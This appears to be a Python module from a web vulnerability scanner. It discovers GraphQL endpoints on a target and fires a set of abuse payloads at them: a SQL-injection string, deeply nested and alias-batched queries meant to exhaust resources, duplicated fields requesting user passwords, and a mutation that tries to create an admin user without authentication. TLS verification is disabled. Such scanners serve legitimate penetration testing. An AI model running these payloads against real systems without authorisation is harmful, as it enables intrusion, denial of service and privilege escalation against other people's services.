import httpx
import json
import re

GRAPHQL_ABUSE_QUERIES = [
    ("sql_injection", "query { user(id: \"1' OR '1'='1\") { id name email } }"),
    ("deep_nesting", "query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }"),
    ("alias_batching", "query { a: __typename b: __typename c: __typename d: __typename e: __typename f: __typename g: __typename h: __typename i: __typename j: __typename }"),
    ("field_duplication", "query { " + " ".join(f"f{i}: user(id: 1) {{ id name email password }}" for i in range(10)) + " }"),
    ("introspection_auth", "query { __schema { types { name fields { name } } } }"),
]

async def graphql_injection(target: str) -> dict:
    results = []
    base = target.rstrip("/")
    endpoints = [base, base + "/graphql", base + "/v1/graphql", base + "/v2/graphql", base + "/api/graphql", base + "/gql"]

    async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
        # Find active GraphQL endpoint
        active_endpoint = None
        for ep in endpoints:
            try:
                r = await client.post(ep, json={"query": "query { __typename }"})
                if r.status_code == 200 and "data" in r.text:
                    active_endpoint = ep
                    results.append({"test": "endpoint_discovery", "endpoint": ep, "status": r.status_code, "risk": "INFO"})
                    break
            except Exception:
                pass

        if not active_endpoint:
            return {"target": target, "error": "No GraphQL endpoint found", "results": []}

        # Test abuse queries
        for name, query in GRAPHQL_ABUSE_QUERIES:
            try:
                r = await client.post(active_endpoint, json={"query": query})
                if r.status_code == 200:
                    data = r.json()
                    has_data = "data" in data and data["data"] is not None
                    has_errors = "errors" in data

                    if "sql_injection" in name and has_data:
                        results.append({"test": name, "vulnerable": True, "note": "SQL injection via GraphQL may be possible", "risk": "CRITICAL"})
                    elif "deep_nesting" in name and has_data:
                        results.append({"test": name, "vulnerable": True, "note": "Deep nesting query succeeded — potential DoS", "risk": "HIGH"})
                    elif "alias_batching" in name and has_data:
                        results.append({"test": name, "vulnerable": True, "note": "Alias batching not restricted — potential abuse", "risk": "MEDIUM"})
                    elif "field_duplication" in name and has_data:
                        results.append({"test": name, "vulnerable": True, "note": "Field duplication allowed — potential resource exhaustion", "risk": "MEDIUM"})
                    elif "introspection" in name and has_data:
                        results.append({"test": name, "vulnerable": True, "note": "Introspection enabled without auth", "risk": "HIGH"})
                else:
                    results.append({"test": name, "vulnerable": False, "status": r.status_code, "note": "Blocked or errored"})
            except Exception:
                results.append({"test": name, "vulnerable": False, "error": "Request failed"})

        # Test auth bypass
        try:
            r = await client.post(active_endpoint, json={"query": "mutation { createUser(input: {role: admin}) { id role } }"})
            if r.status_code == 200 and "errors" not in r.text:
                results.append({"test": "auth_bypass_mutation", "vulnerable": True, "note": "Mutation succeeded without auth", "risk": "CRITICAL"})
        except Exception:
            pass

    return {"target": target, "active_endpoint": active_endpoint, "results": results, "vulnerable": any(r.get("vulnerable") for r in results)}
